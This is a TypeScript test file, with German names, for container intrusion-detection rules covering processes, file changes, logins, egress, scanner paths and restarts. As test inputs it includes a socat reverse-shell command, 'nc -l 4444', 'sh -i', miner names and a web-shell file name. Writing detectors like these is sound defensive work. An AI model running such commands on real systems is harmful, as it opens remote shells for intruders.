import { test, describe } from 'node:test'
import assert from 'node:assert/strict'
import {
  classifyProgram, diffManifest, evaluateContainer, evaluateEgress, evaluateFiles, evaluateLogins, evaluateProcesses, evaluateSessions,
  evaluateSite, execCandidates, addedFiles, fingerprintOf, healthcheckPrograms, isScannerPath, meaningfulChanges, normalFileEntries,
  parseTop, programOf, WebScanCounter, type FsChange, type LoginEvent,
} from './rules.js'

/** Nacht 3, Etappe 5: Bewertung der Hinweise (rein) */

const AT = new Date('2026-11-12T22:00:00Z')
const P = '11111111-1111-4111-8111-111111111111'

describe('Programme aus docker top', () => {
  test('Name aus der Befehlszeile: Pfad, Login-Shell, Prozesstitel, Kernel-Thread', () => {
    assert.equal(programOf('/usr/local/bin/node /app/server.js'), 'node')
    assert.equal(programOf('-bash'), 'bash')
    assert.equal(programOf('nginx: master process nginx -g daemon off;'), 'nginx')
    assert.equal(programOf('postgres: checkpointer'), 'postgres')
    assert.equal(programOf('[kworker/0:1]'), null)
    assert.equal(programOf('   '), null)
  })

  test('Spalten finden (PID, CMD), auch wenn ps andere Titel liefert', () => {
    const top = { Titles: ['UID', 'PID', 'PPID', 'C', 'STIME', 'TTY', 'TIME', 'CMD'], Processes: [['root', '12', '1', '0', '22:00', '?', '00:00:00', 'sh -c sleep 5']] }
    assert.deepEqual(parseTop(top), [{ pid: '12', cmd: 'sh -c sleep 5' }])
    assert.deepEqual(parseTop({ Titles: ['PID', 'COMMAND'], Processes: [['3', 'xmrig']] }), [{ pid: '3', cmd: 'xmrig' }])
    assert.deepEqual(parseTop({ Titles: ['X'], Processes: [['1']] }), [])
    assert.deepEqual(parseTop(null), [])
  })

  test('Einordnung: Miner, aus /tmp, Shell/Netzwerk-Werkzeug, sonst neu', () => {
    assert.equal(classifyProgram('xmrig', 'xmrig --donate-level 1'), 'miner')
    assert.equal(classifyProgram('kdevtmpfsi', '/tmp/kdevtmpfsi'), 'miner')
    assert.equal(classifyProgram('x', '/dev/shm/x -o pool'), 'tmp')
    assert.equal(classifyProgram('sh', 'sh -i'), 'verdaechtig')
    assert.equal(classifyProgram('curl', 'curl http://example.com'), 'verdaechtig')
    assert.equal(classifyProgram('socat', 'socat tcp:1.2.3.4:4444 exec:sh'), 'verdaechtig')
    assert.equal(classifyProgram('python3', 'python3 app.py'), 'neu')
  })

  test('Healthcheck-Programme gehören von Anfang an zur Grundlinie', () => {
    assert.deepEqual(healthcheckPrograms(['CMD-SHELL', 'curl -f http://localhost/ || exit 1']).sort(), ['curl', 'exit', 'sh'])
    assert.deepEqual(healthcheckPrograms(['CMD', '/usr/bin/wget', '-q', '--spider', 'http://localhost']), ['wget'])
    assert.deepEqual(healthcheckPrograms(['NONE']), [])
    assert.deepEqual(healthcheckPrograms(null), [])
  })
})

describe('Prozesse gegen die Grundlinie', () => {
  const base = { projectId: P, service: 'web', learned: new Set(['node']), allowed: new Set<string>(), reported: new Set<string>(), at: AT }

  test('Lernen: neue Programme kommen in die Grundlinie, kein Hinweis – ausser Minern', () => {
    const r = evaluateProcesses({ ...base, learning: true, processes: [{ pid: '1', cmd: 'node server.js' }, { pid: '7', cmd: 'sh -c npm start' }, { pid: '9', cmd: 'xmrig' }] })
    assert.deepEqual(r.learn, ['sh'])
    assert.equal(r.signals.length, 1)
    assert.equal(r.signals[0]!.kind, 'prozess_miner')
    assert.equal(r.signals[0]!.severity, 'kritisch')
  })

  test('Nach dem Lernen: Shell ohne Grundlinie ist hoch, unbekanntes Programm mittel, Bekanntes still', () => {
    const r = evaluateProcesses({ ...base, learning: false, processes: [
      { pid: '1', cmd: 'node server.js' }, { pid: '40', cmd: '/bin/sh -i' }, { pid: '41', cmd: 'sh' }, { pid: '50', cmd: 'python3 x.py' },
    ] })
    const sh = r.signals.find((s) => s.subject === 'sh')!
    assert.equal(sh.kind, 'prozess_verdaechtig')
    assert.equal(sh.severity, 'hoch')
    assert.equal(sh.count, 2)
    assert.match(sh.title, /^Shell gestartet: sh \(Dienst web\)$/)
    assert.equal(r.signals.find((s) => s.subject === 'python3')!.severity, 'mittel')
    assert.deepEqual(r.reported.sort(), ['python3:50', 'sh:40', 'sh:41'])
  })

  test('Als normal markiert oder schon gezählt: kein neuer Hinweis (keine Flut je Minute)', () => {
    const r = evaluateProcesses({ ...base, learning: false, allowed: new Set(['python3']), reported: new Set(['sh:40']), processes: [{ pid: '40', cmd: 'sh' }, { pid: '50', cmd: 'python3' }] })
    assert.equal(r.signals.length, 0)
  })

  test('Fingerabdruck: Projekt, Art, Dienst und Programm (über Deployments hinweg derselbe Vorfall)', () => {
    const r = evaluateProcesses({ ...base, learning: false, processes: [{ pid: '2', cmd: 'nc -l 4444' }] })
    assert.equal(fingerprintOf(r.signals[0]!), `${P}|prozess_verdaechtig|web|nc`)
  })
})

describe('Dateien gegen die Grundlinie (docker diff)', () => {
  const diff: FsChange[] = [
    { path: '/usr', kind: 0 }, { path: '/usr/share', kind: 0 }, { path: '/usr/share/nginx', kind: 1 },
    { path: '/usr/share/nginx/html', kind: 1 }, { path: '/usr/share/nginx/html/shell.php', kind: 1 },
    { path: '/tmp', kind: 0 }, { path: '/tmp/x', kind: 1 }, { path: '/run/nginx.pid', kind: 1 },
    { path: '/etc', kind: 0 }, { path: '/etc/passwd', kind: 0 }, { path: '/etc/nginx', kind: 0 }, { path: '/etc/nginx/conf.d', kind: 0 }, { path: '/etc/nginx/conf.d/default.conf', kind: 0 },
  ]
  const base = { projectId: P, service: null, allowed: [] as string[], reported: new Set<string>(), at: AT }

  test('Nur Blätter, ohne Laufzeit-Orte', () => {
    assert.deepEqual(meaningfulChanges(diff).map((c) => c.path), ['/usr/share/nginx/html/shell.php', '/etc/passwd', '/etc/nginx/conf.d/default.conf'])
  })

  test('Lernen: alles in die Grundlinie, kein Hinweis', () => {
    const r = evaluateFiles({ ...base, changes: diff, learned: new Set(), learning: true, exec: new Map() })
    assert.equal(r.signals.length, 0)
    assert.ok(r.learn.includes('/etc/nginx/conf.d/default.conf'))
  })

  test('Webroot und /etc/passwd sind hoch; Gelerntes und Ordner mit Gelerntem bleiben still', () => {
    const learned = new Set(['/etc/nginx/conf.d/other.conf'])
    const r = evaluateFiles({ ...base, changes: diff, learned, learning: false, exec: new Map() })
    const kinds = Object.fromEntries(r.signals.map((s) => [s.kind, s]))
    assert.equal(kinds.datei_webroot?.severity, 'hoch')
    assert.deepEqual(kinds.datei_webroot?.samples, ['/usr/share/nginx/html/shell.php (neu)'])
    assert.equal(kinds.datei_system?.severity, 'hoch')
    assert.deepEqual(kinds.datei_system?.samples, ['/etc/passwd (geändert)'])
    assert.equal(r.signals.length, 2)
  })

  test('Ausführbare neue Datei (auch in /tmp) ist hoch; schon Gemeldetes kommt nicht wieder', () => {
    const exec = new Map([['/tmp/x', true]])
    const r = evaluateFiles({ ...base, changes: diff, learned: new Set(), learning: false, exec })
    assert.equal(r.signals.find((s) => s.kind === 'datei_ausfuehrbar')?.subject, '/tmp/x')
    const again = evaluateFiles({ ...base, changes: diff, learned: new Set(), learning: false, exec, reported: new Set(r.reported) })
    assert.equal(again.signals.length, 0)
  })

  test('Kandidaten für die Rechte-Prüfung: neue Dateien, /tmp zuerst, begrenzt', () => {
    const c = execCandidates(addedFiles(diff), () => false, 2)
    assert.deepEqual(c, ['/tmp/x', '/usr/share/nginx/html/shell.php'])
  })

  test('Als normal: Ordner (zwei Ebenen tief), ausführbare Dateien genau', () => {
    assert.deepEqual(normalFileEntries('datei_webroot', ['/var/www/html/uploads/a.jpg (neu)', '/var/www/html/uploads/b.jpg (neu)']), ['/var/www/html/uploads/'])
    assert.deepEqual(normalFileEntries('datei_system', ['/etc/motd (geändert)']), ['/etc/motd'])
    assert.deepEqual(normalFileEntries('datei_ausfuehrbar', ['/app/bin/tool (neu)']), ['/app/bin/tool'])
  })

  test('Als normal markierter Ordner unterdrückt die Meldung', () => {
    const r = evaluateFiles({ ...base, allowed: ['/usr/share/nginx/html/'], changes: diff, learned: new Set(['/etc/passwd', '/etc/nginx/conf.d/default.conf']), learning: false, exec: new Map() })
    assert.equal(r.signals.length, 0)
  })
})

describe('Statische Seiten', () => {
  test('neu, geändert, gelöscht – je einmal gemeldet', () => {
    const d = diffManifest({ 'index.html': 'a', 'x.css': 'b' }, { 'index.html': 'z', 'shell.php': 'c' })
    assert.deepEqual(d, { added: ['shell.php'], changed: ['index.html'], removed: ['x.css'] })
    const r = evaluateSite(P, d, new Set(), AT)
    assert.equal(r.signal?.kind, 'datei_seite')
    assert.equal(r.signal?.severity, 'hoch')
    assert.equal(r.signal?.count, 3)
    assert.equal(evaluateSite(P, d, new Set(r.reported), AT).signal, null)
    assert.equal(evaluateSite(P, diffManifest({ a: '1' }, { a: '1' }), new Set(), AT).signal, null)
  })
})

describe('Anmeldung', () => {
  const ev = (id: number, ip: string, minAgo: number, extra: Partial<LoginEvent> = {}): LoginEvent => ({ id, at: new Date(AT.getTime() - minAgo * 60_000), action: 'auth.login', result: 'error', ip, reason: 'password', ...extra })

  test('ab 5 Fehlversuchen in 15 Min. je Adresse; beim ersten Mal zählen alle im Fenster', () => {
    const events = [1, 2, 3, 4].map((i) => ev(i, '192.168.1.50', 5)).concat(ev(5, '192.168.1.50', 1), ev(6, '192.168.1.60', 1))
    const s = evaluateLogins(events, 4, AT)
    assert.equal(s.length, 1)
    assert.equal(s[0]!.kind, 'login_fehlversuche')
    assert.equal(s[0]!.severity, 'mittel')
    assert.equal(s[0]!.count, 1)
    assert.equal(s[0]!.initialCount, 5)
    // Nichts Neues seit dem Cursor: still
    assert.equal(evaluateLogins(events, 6, AT).length, 0)
    // Ältere als 15 Minuten zählen nicht
    assert.equal(evaluateLogins([1, 2, 3, 4, 5].map((i) => ev(i, '10.0.0.1', 20)), 0, AT).length, 0)
  })

  test('ab 20 Fehlversuchen hoch; Sperre des Kontos hoch, einer Adresse mittel', () => {
    const many = Array.from({ length: 20 }, (_, i) => ev(i + 1, '100.64.0.9', 2))
    assert.equal(evaluateLogins(many, 0, AT)[0]!.severity, 'hoch')
    const locks = evaluateLogins([
      { id: 30, at: AT, action: 'auth.lockout', result: 'error', ip: '192.168.1.5', scope: 'ip' },
      { id: 31, at: AT, action: 'auth.lockout', result: 'error', ip: '192.168.1.5', scope: 'user' },
    ], 0, AT)
    assert.deepEqual(locks.map((l) => [l.kind, l.severity, l.key]), [['login_sperre', 'mittel', '192.168.1.5'], ['login_sperre', 'hoch', 'konto']])
  })

  test('neues Gerät hoch, neuer Zugang mittel, erste Anmeldung überhaupt still', () => {
    const known = [{ device: 'Firefox auf macOS', access: 'lan', ip: '192.168.1.2', at: AT }]
    const s = evaluateSessions([
      { device: 'Chrome auf Windows', access: 'lan', ip: '192.168.1.77', at: AT },
      { device: 'Firefox auf macOS', access: 'tailnet', ip: '100.64.0.2', at: AT },
      { device: 'Firefox auf macOS', access: 'lan', ip: '192.168.1.2', at: AT },
    ], known, AT)
    assert.deepEqual(s.map((x) => [x.kind, x.severity]), [['login_neues_geraet', 'hoch'], ['login_neuer_zugang', 'mittel']])
    assert.equal(evaluateSessions([{ device: 'Safari auf iPhone', access: 'lan', ip: null, at: AT }], [], AT).length, 0)
  })
})

describe('Netz und Web', () => {
  test('gesperrte Versuche je Projekt gebündelt; viele Ziele = hoch; als normal markierte Ziele fallen weg', () => {
    const rows = [
      { projectId: P, destination: '192.168.0.12', port: 445, protocol: 'tcp', count: 3, toServer: false },
      { projectId: P, destination: '192.168.0.1', port: 80, protocol: 'tcp', count: 1, toServer: true },
    ]
    const s = evaluateEgress(rows, () => new Set(['192.168.0.1:80']), AT)
    assert.equal(s.length, 1)
    assert.equal(s[0]!.count, 3)
    assert.equal(s[0]!.severity, 'mittel')
    assert.deepEqual(s[0]!.samples, ['192.168.0.12:445/tcp (3×)'])
    const scan = Array.from({ length: 10 }, (_, i) => ({ projectId: P, destination: `192.168.0.${i + 2}`, port: 22, protocol: 'tcp', count: 1, toServer: false }))
    assert.equal(evaluateEgress(scan, () => new Set(), AT)[0]!.severity, 'hoch')
  })

  test('Scanner-Pfade erkennen, normale Pfade nicht', () => {
    for (const p of ['/wp-admin/', '/wp-login.php', '/.git/config', '/.env', '/phpmyadmin/', '/vendor/phpunit/x', '/cgi-bin/luci', '/backup.sql']) assert.ok(isScannerPath(p), p)
    for (const p of ['/', '/blog/wordpress-tipps', '/assets/app.js', '/.well-known/security.txt', '/environment']) assert.ok(!isScannerPath(p), p)
  })

  test('Scan von aussen: erst ab der Schwelle, danach nur Neues, niedriger Schweregrad', () => {
    const c = new WebScanCounter()
    const t = AT.getTime()
    for (let i = 0; i < 4; i++) c.add(P, { at: t, path: '/.env', status: 404, source: '1.2.3.4' })
    c.add(P, { at: t, path: '/', status: 200, source: '1.2.3.4' })
    assert.equal(c.drain(AT).length, 0)
    c.add(P, { at: t, path: '/wp-login.php', status: 404, source: '5.6.7.8' })
    const s = c.drain(AT)
    assert.equal(s.length, 1)
    assert.equal(s[0]!.severity, 'niedrig')
    assert.equal(s[0]!.initialCount, 5)
    assert.match(s[0]!.samples[0]!, /5 Scanner-Pfade, 0 weitere 4xx, 2 Absender/)
    assert.equal(c.drain(AT).length, 0)
    c.add(P, { at: t, path: '/.git/HEAD', status: 404, source: '1.2.3.4' })
    assert.equal(c.drain(AT)[0]!.count, 1)
  })
})

describe('Container: Neustarts und Speichergrenze', () => {
  test('erste Sicht ist Grundlinie; RestartCount steigt → Hinweis; OOM einmal je Ende', () => {
    const now = { restartCount: 0, startedAt: 'a', running: true, oomKilled: false, finishedAt: null }
    assert.equal(evaluateContainer(P, 'web', null, now, AT).signals.length, 0)
    const r = evaluateContainer(P, 'web', { restartCount: 0, startedAt: 'a', oomFor: null }, { ...now, restartCount: 2, startedAt: 'b' }, AT)
    assert.deepEqual(r.signals.map((s) => [s.kind, s.count]), [['container_neustart', 2]])
    const oom = evaluateContainer(P, null, r.next, { restartCount: 2, startedAt: 'b', running: false, oomKilled: true, finishedAt: 'c' }, AT)
    assert.deepEqual(oom.signals.map((s) => s.kind), ['container_oom'])
    assert.equal(evaluateContainer(P, null, oom.next, { restartCount: 2, startedAt: 'b', running: false, oomKilled: true, finishedAt: 'c' }, AT).signals.length, 0)
  })
})
